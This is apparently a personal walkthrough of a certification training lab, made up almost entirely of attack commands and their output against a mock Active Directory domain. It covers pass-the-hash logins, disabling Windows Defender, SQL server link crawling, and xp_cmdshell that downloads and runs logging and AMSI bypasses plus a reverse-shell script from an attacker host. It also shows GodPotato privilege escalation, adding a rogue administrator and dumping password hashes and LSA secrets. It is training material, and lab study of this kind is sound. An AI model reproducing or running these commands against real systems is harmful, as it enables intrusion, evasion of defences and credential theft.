- Enumerating access rights to `DCORP-MSSQL` as `student303`.
```
┌──(root💀0xDe4dBe3f)-[/home/…/AlteredSecurity/CRTP/LinuxAttack/tickets]
└─# crackmapexec mssql 172.16.3.21 -u student303 -p a5fdNPDwScrD7T2A
MSSQL       172.16.3.21     1433   DCORP-MSSQL      [*] Windows 10.0 Build 20348 (name:DCORP-MSSQL) (domain:dollarcorp.moneycorp.local)
MSSQL       172.16.3.21     1433   DCORP-MSSQL      [+] dollarcorp.moneycorp.local\student303:a5fdNPDwScrD7T2A 

```

- Executing MSSQL queries as `student303`
```
┌──(root💀0xDe4dBe3f)-[/home/…/AlteredSecurity/CRTP/LinuxAttack/tickets]
└─# crackmapexec mssql 172.16.3.21 -u student303 -p a5fdNPDwScrD7T2A -q "SELECT name FROM master.dbo.sysdatabases"

MSSQL       172.16.3.21     1433   DCORP-MSSQL      [*] Windows 10.0 Build 20348 (name:DCORP-MSSQL) (domain:dollarcorp.moneycorp.local)
MSSQL       172.16.3.21     1433   DCORP-MSSQL      [+] dollarcorp.moneycorp.local\student303:a5fdNPDwScrD7T2A 
MSSQL       172.16.3.21     1433   DCORP-MSSQL      name
MSSQL       172.16.3.21     1433   DCORP-MSSQL      --------------------------------------------------------------------------------------------------------------------------------
MSSQL       172.16.3.21     1433   DCORP-MSSQL      master
MSSQL       172.16.3.21     1433   DCORP-MSSQL      tempdb
MSSQL       172.16.3.21     1433   DCORP-MSSQL      model
MSSQL       172.16.3.21     1433   DCORP-MSSQL      msdb
```

- Enumerate linked database servers.
```
┌──(root💀0xDe4dBe3f)-[~]
└─# crackmapexec mssql 172.16.3.21 -u student303 -p a5fdNPDwScrD7T2A -q "select * from master..sysservers"
MSSQL       172.16.3.21     1433   DCORP-MSSQL      [*] Windows 10.0 Build 20348 (name:DCORP-MSSQL) (domain:dollarcorp.moneycorp.local)
MSSQL       172.16.3.21     1433   DCORP-MSSQL      [+] dollarcorp.moneycorp.local\student303:a5fdNPDwScrD7T2A 
MSSQL       172.16.3.21     1433   DCORP-MSSQL      srvid
MSSQL       172.16.3.21     1433   DCORP-MSSQL      srvstatus
MSSQL       172.16.3.21     1433   DCORP-MSSQL      srvname
MSSQL       172.16.3.21     1433   DCORP-MSSQL      srvproduct
MSSQL       172.16.3.21     1433   DCORP-MSSQL      providername
MSSQL       172.16.3.21     1433   DCORP-MSSQL      datasource
MSSQL       172.16.3.21     1433   DCORP-MSSQL      location
MSSQL       172.16.3.21     1433   DCORP-MSSQL      providerstring
MSSQL       172.16.3.21     1433   DCORP-MSSQL      schemadate
MSSQL       172.16.3.21     1433   DCORP-MSSQL      topologyx
MSSQL       172.16.3.21     1433   DCORP-MSSQL      topologyy
MSSQL       172.16.3.21     1433   DCORP-MSSQL      catalog
MSSQL       172.16.3.21     1433   DCORP-MSSQL      srvcollation
MSSQL       172.16.3.21     1433   DCORP-MSSQL      connecttimeout
MSSQL       172.16.3.21     1433   DCORP-MSSQL      querytimeout
MSSQL       172.16.3.21     1433   DCORP-MSSQL      srvnetname
MSSQL       172.16.3.21     1433   DCORP-MSSQL      isremote
MSSQL       172.16.3.21     1433   DCORP-MSSQL      rpc
MSSQL       172.16.3.21     1433   DCORP-MSSQL      pub
MSSQL       172.16.3.21     1433   DCORP-MSSQL      sub
MSSQL       172.16.3.21     1433   DCORP-MSSQL      dist
MSSQL       172.16.3.21     1433   DCORP-MSSQL      dpub
MSSQL       172.16.3.21     1433   DCORP-MSSQL      rpcout
MSSQL       172.16.3.21     1433   DCORP-MSSQL      dataaccess
MSSQL       172.16.3.21     1433   DCORP-MSSQL      collationcompatible
MSSQL       172.16.3.21     1433   DCORP-MSSQL      system
MSSQL       172.16.3.21     1433   DCORP-MSSQL      useremotecollation
MSSQL       172.16.3.21     1433   DCORP-MSSQL      lazyschemavalidation
MSSQL       172.16.3.21     1433   DCORP-MSSQL      collation
MSSQL       172.16.3.21     1433   DCORP-MSSQL      nonsqlsub
MSSQL       172.16.3.21     1433   DCORP-MSSQL      -----------
MSSQL       172.16.3.21     1433   DCORP-MSSQL      -----------
MSSQL       172.16.3.21     1433   DCORP-MSSQL      --------------------------------------------------------------------------------------------------------------------------------
MSSQL       172.16.3.21     1433   DCORP-MSSQL      --------------------------------------------------------------------------------------------------------------------------------
MSSQL       172.16.3.21     1433   DCORP-MSSQL      --------------------------------------------------------------------------------------------------------------------------------
MSSQL       172.16.3.21     1433   DCORP-MSSQL      ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
MSSQL       172.16.3.21     1433   DCORP-MSSQL      ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
MSSQL       172.16.3.21     1433   DCORP-MSSQL      ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
MSSQL       172.16.3.21     1433   DCORP-MSSQL      ----------
MSSQL       172.16.3.21     1433   DCORP-MSSQL      -----------
MSSQL       172.16.3.21     1433   DCORP-MSSQL      -----------
MSSQL       172.16.3.21     1433   DCORP-MSSQL      --------------------------------------------------------------------------------------------------------------------------------
MSSQL       172.16.3.21     1433   DCORP-MSSQL      --------------------------------------------------------------------------------------------------------------------------------
MSSQL       172.16.3.21     1433   DCORP-MSSQL      --------------
MSSQL       172.16.3.21     1433   DCORP-MSSQL      ------------
MSSQL       172.16.3.21     1433   DCORP-MSSQL      ------------------------------
MSSQL       172.16.3.21     1433   DCORP-MSSQL      --------
MSSQL       172.16.3.21     1433   DCORP-MSSQL      ----------
MSSQL       172.16.3.21     1433   DCORP-MSSQL      ----------
MSSQL       172.16.3.21     1433   DCORP-MSSQL      ---
MSSQL       172.16.3.21     1433   DCORP-MSSQL      ----
MSSQL       172.16.3.21     1433   DCORP-MSSQL      ----
MSSQL       172.16.3.21     1433   DCORP-MSSQL      ----------
MSSQL       172.16.3.21     1433   DCORP-MSSQL      ----------
MSSQL       172.16.3.21     1433   DCORP-MSSQL      -------------------
MSSQL       172.16.3.21     1433   DCORP-MSSQL      ----------
MSSQL       172.16.3.21     1433   DCORP-MSSQL      ------------------
MSSQL       172.16.3.21     1433   DCORP-MSSQL      --------------------
MSSQL       172.16.3.21     1433   DCORP-MSSQL      --------------------------------------------------------------------------------------------------------------------------------                                                    
MSSQL       172.16.3.21     1433   DCORP-MSSQL      ---------
MSSQL       172.16.3.21     1433   DCORP-MSSQL      0
MSSQL       172.16.3.21     1433   DCORP-MSSQL      1089
MSSQL       172.16.3.21     1433   DCORP-MSSQL      DCORP-MSSQL
MSSQL       172.16.3.21     1433   DCORP-MSSQL      SQL Server
MSSQL       172.16.3.21     1433   DCORP-MSSQL      SQLOLEDB
MSSQL       172.16.3.21     1433   DCORP-MSSQL      DCORP-MSSQL
MSSQL       172.16.3.21     1433   DCORP-MSSQL      2022-11-14 04:46:10
MSSQL       172.16.3.21     1433   DCORP-MSSQL      0
MSSQL       172.16.3.21     1433   DCORP-MSSQL      0
MSSQL       172.16.3.21     1433   DCORP-MSSQL      0
MSSQL       172.16.3.21     1433   DCORP-MSSQL      0
MSSQL       172.16.3.21     1433   DCORP-MSSQL      b'DCORP-MSSQL                   '
MSSQL       172.16.3.21     1433   DCORP-MSSQL      1
MSSQL       172.16.3.21     1433   DCORP-MSSQL      1
MSSQL       172.16.3.21     1433   DCORP-MSSQL      0
MSSQL       172.16.3.21     1433   DCORP-MSSQL      0
MSSQL       172.16.3.21     1433   DCORP-MSSQL      0
MSSQL       172.16.3.21     1433   DCORP-MSSQL      0
MSSQL       172.16.3.21     1433   DCORP-MSSQL      1
MSSQL       172.16.3.21     1433   DCORP-MSSQL      0
MSSQL       172.16.3.21     1433   DCORP-MSSQL      0
MSSQL       172.16.3.21     1433   DCORP-MSSQL      0
MSSQL       172.16.3.21     1433   DCORP-MSSQL      1
MSSQL       172.16.3.21     1433   DCORP-MSSQL      0
MSSQL       172.16.3.21     1433   DCORP-MSSQL      0
MSSQL       172.16.3.21     1433   DCORP-MSSQL      1
MSSQL       172.16.3.21     1433   DCORP-MSSQL      1184
MSSQL       172.16.3.21     1433   DCORP-MSSQL      DCORP-SQL1
MSSQL       172.16.3.21     1433   DCORP-MSSQL      SQL Server
MSSQL       172.16.3.21     1433   DCORP-MSSQL      SQLOLEDB
MSSQL       172.16.3.21     1433   DCORP-MSSQL      DCORP-SQL1
MSSQL       172.16.3.21     1433   DCORP-MSSQL      2022-12-04 05:16:19
MSSQL       172.16.3.21     1433   DCORP-MSSQL      0
MSSQL       172.16.3.21     1433   DCORP-MSSQL      0
MSSQL       172.16.3.21     1433   DCORP-MSSQL      0
MSSQL       172.16.3.21     1433   DCORP-MSSQL      0
MSSQL       172.16.3.21     1433   DCORP-MSSQL      b'DCORP-SQL1                    '
MSSQL       172.16.3.21     1433   DCORP-MSSQL      0
MSSQL       172.16.3.21     1433   DCORP-MSSQL      0
MSSQL       172.16.3.21     1433   DCORP-MSSQL      0
MSSQL       172.16.3.21     1433   DCORP-MSSQL      0
MSSQL       172.16.3.21     1433   DCORP-MSSQL      0
MSSQL       172.16.3.21     1433   DCORP-MSSQL      0
MSSQL       172.16.3.21     1433   DCORP-MSSQL      0
MSSQL       172.16.3.21     1433   DCORP-MSSQL      1
MSSQL       172.16.3.21     1433   DCORP-MSSQL      0
MSSQL       172.16.3.21     1433   DCORP-MSSQL      0
MSSQL       172.16.3.21     1433   DCORP-MSSQL      1
MSSQL       172.16.3.21     1433   DCORP-MSSQL      0
MSSQL       172.16.3.21     1433   DCORP-MSSQL      0

```

- Shell on `DCORP-MSSQL` to enable RDP access.
```
┌──(root💀0xDe4dBe3f)-[/home/…/AlteredSecurity/CRTP/LinuxAttack/tickets]
└─# crackmapexec smb 172.16.3.21 -u sqladmin -H 07e8be316e3da9a042a9cb681df19bf5
SMB         172.16.3.21     445    DCORP-MSSQL      [*] Windows 10.0 Build 20348 x64 (name:DCORP-MSSQL) (domain:dollarcorp.moneycorp.local) (signing:False) (SMBv1:False)
SMB         172.16.3.21     445    DCORP-MSSQL      [+] dollarcorp.moneycorp.local\sqladmin:07e8be316e3da9a042a9cb681df19bf5 (🩸Blooded!🩸)
SMB         172.16.3.21     445    DCORP-MSSQL      Node SQLADMIN@DOLLARCORP.MONEYCORP.LOCAL successfully set as owned in BloodHound
```

```
┌──(root💀0xDe4dBe3f)-[/home/…/AlteredSecurity/CRTP/LinuxAttack/tickets]
└─# evil-winrm -i 172.16.3.21 -u sqladmin -H 07e8be316e3da9a042a9cb681df19bf5

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\sqladmin\Documents> Set-MpPreference -DisableRealtimeMonitoring $true
*Evil-WinRM* PS C:\Users\sqladmin\Documents> Set-ItemProperty 'HKLM:\System\CurrentControlSet\Control\Terminal Server' fDenyTSConnections 0
*Evil-WinRM* PS C:\Users\sqladmin\Documents> Enable-NetFirewallRule -DisplayName 'Remote Desktop - User Mode (TCP-In)'
*Evil-WinRM* PS C:\Users\sqladmin\Documents> Enable-NetFirewallRule -DisplayName 'Remote Desktop - User Mode (UDP-In)'
*Evil-WinRM* PS C:\Users\sqladmin\Documents> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
The operation completed successfully.

*Evil-WinRM* PS C:\Users\sqladmin\Documents> exit

Info: Exiting with code 0

```

```
┌──(root💀0xDe4dBe3f)-[/home/…/AlteredSecurity/CRTP/LinuxAttack/tickets]
└─# xfreerdp /v:172.16.3.21 /u:sqladmin /pth:07e8be316e3da9a042a9cb681df19bf5
[20:36:37:585] [100842:100843] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[20:36:37:585] [100842:100843] [WARN][com.freerdp.crypto] - CN = dcorp-mssql.dollarcorp.moneycorp.local
[20:36:40:197] [100842:100843] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[20:36:40:197] [100842:100843] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[20:36:40:238] [100842:100843] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[20:36:40:238] [100842:100843] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
```

- Transfer `PowerUpSQL.ps1` to `DCORP-MSSQL`.

- Grant full access rights to `PowerUpSQL.ps1` for `student303` in order to be able to import it and use it.
```
PS C:\Windows\Tasks> icacls C:\Windows\Tasks\* /grant:r dcorp\student303:F
```

- Create a `powershell` process as `student303` since `sqladmin` can not run MSSQL queries.
```
PS C:\Windows\Tasks> runas.exe /user:dcorp\student303 powershell
Enter the password for dcorp\student303:
Attempting to start powershell as user "dcorp\student303" ...
```

- Import `PowerUpSQL` to the new `powershell` process and use it to exploit the linked database servers.
```
PS C:\Windows\Tasks> ipmo .\PowerUpSQL.ps1
```

- Find all linked database servers.
```
PS C:\Windows\Tasks> Get-SQLServerLinkCrawl


Version     : SQL Server 2019
Instance    : DCORP-MSSQL
CustomQuery :
Sysadmin    : 0
Path        : {DCORP-MSSQL}
User        : dcorp\student303
Links       : {DCORP-SQL1}

Version     : SQL Server 2019
Instance    : DCORP-SQL1
CustomQuery :
Sysadmin    : 0
Path        : {DCORP-MSSQL, DCORP-SQL1}
User        : dblinkuser
Links       : {DCORP-MGMT}

Version     : SQL Server 2019
Instance    : DCORP-MGMT
CustomQuery :
Sysadmin    : 0
Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT}
User        : sqluser
Links       : {EU-SQL.EU.EUROCORP.LOCAL}

Version     : SQL Server 2019
Instance    : EU-SQL
CustomQuery :
Sysadmin    : 1
Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT, EU-SQL.EU.EUROCORP.LOCAL}
User        : sa
Links       :
```

- Check for command execution rights to the database servers.
```
PS C:\Windows\Tasks> Get-SQLServerLinkCrawl -Query "exec master..xp_cmdshell 'whoami'"


Version     : SQL Server 2019
Instance    : DCORP-MSSQL
CustomQuery :
Sysadmin    : 0
Path        : {DCORP-MSSQL}
User        : dcorp\student303
Links       : {DCORP-SQL1}

Version     : SQL Server 2019
Instance    : DCORP-SQL1
CustomQuery :
Sysadmin    : 0
Path        : {DCORP-MSSQL, DCORP-SQL1}
User        : dblinkuser
Links       : {DCORP-MGMT}

Version     : SQL Server 2019
Instance    : DCORP-MGMT
CustomQuery :
Sysadmin    : 0
Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT}
User        : sqluser
Links       : {EU-SQL.EU.EUROCORP.LOCAL}

Version     : SQL Server 2019
Instance    : EU-SQL
CustomQuery : {nt authority\network service, }
Sysadmin    : 1
Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT, EU-SQL.EU.EUROCORP.LOCAL}
User        : sa
Links       :
```

- Get a reverse shell on `EU-SQL`.
```
PS C:\Windows\Tasks> Get-SQLServerLinkCrawl -Query 'exec master..xp_cmdshell ''powershell -c "iex (iwr -UseBasicParsing http://172.16.99.3/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://172.16.99.3/amsibypass.txt);iex (iwr -UseBasicParsing http://172.16.99.3/Invoke-PowerShellTcp.ps1)"''' -QueryTarget eu-sql
```

```
┌──(root💀0xDe4dBe3f)-[/home/…/AlteredSecurity/CRTP/LinuxAttack/fileserver]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
172.16.15.17 - - [07/Aug/2023 20:50:47] "GET /sbloggingbypass.txt HTTP/1.1" 200 -
172.16.15.17 - - [07/Aug/2023 20:50:48] "GET /amsibypass.txt HTTP/1.1" 200 -
172.16.15.17 - - [07/Aug/2023 20:50:48] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -

```

```
┌──(root💀0xDe4dBe3f)-[/home/…/Pentesting/AlteredSecurity/CRTP/LinuxAttack]
└─# rlwrap nc -lvnp 443
listening on [any] 443 ...
connect to [172.16.99.3] from (UNKNOWN) [172.16.15.17] 52711
Windows PowerShell running as user EU-SQL$ on EU-SQL
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>hostname
eu-sql
PS C:\Windows\system32> whoami
nt authority\network service
PS C:\Windows\system32> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

- Local privilege escalation with `GodPotato.exe` is possible due to our current privileges.
```
PS C:\Windows\Tasks> .\GodPotato-NET4.exe -cmd "C:\Windows\Tasks\nc.exe -t -e C:\Windows\System32\cmd.exe 172.16.99.3 2012"
```

```
┌──(root💀0xDe4dBe3f)-[/home/pri3st/Pentesting/AlteredSecurity/CRTP]
└─# rlwrap nc -lvnp 2012
listening on [any] 2012 ...
connect to [172.16.99.3] from (UNKNOWN) [172.16.15.17] 52848
Microsoft Windows [Version 10.0.20348.1249]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\Tasks>whoami
whoami
nt authority\system

C:\Windows\Tasks>net user testuser WKrByFR7 /add
net user testuser WKrByFR7 /add
The command completed successfully.


C:\Windows\Tasks>net localgroup Administrators testuser /add
net localgroup Administrators testuser /add
The command completed successfully.

```

- Dump credentials from `EU-SQL`
```
┌──(root💀0xDe4dBe3f)-[/home/…/Pentesting/Tools/General_Use/Villain]
└─# impacket-secretsdump EU-SQL/testuser:WKrByFR7@172.16.15.17
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x5522f4ec06d0bf5dac89558b5e57206e
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:4f2686a2f00ff727a04d48d01d635a95:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Pentester:1001:aad3b435b51404eeaad3b435b51404ee:3da6d4f599a780f2d939b794843eb3d9:::
testuser:1002:aad3b435b51404eeaad3b435b51404ee:203384b137f3b04bf6a47c06e17671c5:::
[*] Dumping cached domain logon information (domain/username:hash)
EU.EUROCORP.LOCAL/dbadmin:$DCC2$10240#dbadmin#e1dfb4e157d2d93cbad84aa6337579ab: (2023-03-04 09:42:20)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
EU\EU-SQL$:aes256-cts-hmac-sha1-96:3ea0e7e071709ecdf678dd7da144bfa6b2d83cf9558903c948b6c611f76639d3
EU\EU-SQL$:aes128-cts-hmac-sha1-96:c0c015b740bc0351599304e9088eb552
EU\EU-SQL$:des-cbc-md5:a1cde3105d1019d0
EU\EU-SQL$:plain_password_hex:043226d03bb6a64a91fbb0f907ce24224241993720616e84c07c70a49385080b9ee317bfb682142cfce6506980c1db8a2999283732cdb971893a2798419b49c9c28e5403e7219500f314f9cd4c8469006e9dba7ff3b1a4340d57044d7338f8ebd57893daaad4fa6c35c050c6b116f18ca5e81635283bc80ffb815a731f81b84336b356eeefca551cdf0d5d4f69890912c78f1a21a3c1ad9ef0e43bc38e8f5f1f08d323c469957005f9360c2f83af725ab5e61dc12f875d833c0caff9a6100e0eb62eeee2e2076c474e5a7c1bec26e1096bb9034b2c8a3782f537c49dcdbff6eba6326a7f4d69d25cafc1f9829089c1bc
EU\EU-SQL$:aad3b435b51404eeaad3b435b51404ee:c229c67e89c2898c2584aff7f3401c00:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xe4ed1312a345ef13927866ae066c3aa659d23ed5
dpapi_userkey:0x66b30ebfe4c144d1df515aec7b43e7c05d91c0bb
[*] NL$KM 
 0000   09 C8 7B C2 96 41 6E CB  B2 F6 1B DC 29 5C 39 76   ..{..An.....)\9v
 0010   7E A6 22 97 DC D3 BE 6B  C3 71 48 71 61 6B B2 B3   ~."....k.qHqak..
 0020   D0 D6 E0 48 F0 8B 7D 8B  8B 14 95 05 B4 21 FE 93   ...H..}......!..
 0030   28 51 47 F1 26 24 B5 F4  E4 20 B6 AC E5 90 33 02   (QG.&$... ....3.
NL$KM:09c87bc296416ecbb2f61bdc295c39767ea62297dcd3be6bc3714871616bb2b3d0d6e048f08b7d8b8b149505b421fe93285147f12624b5f4e420b6ace5903302
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
```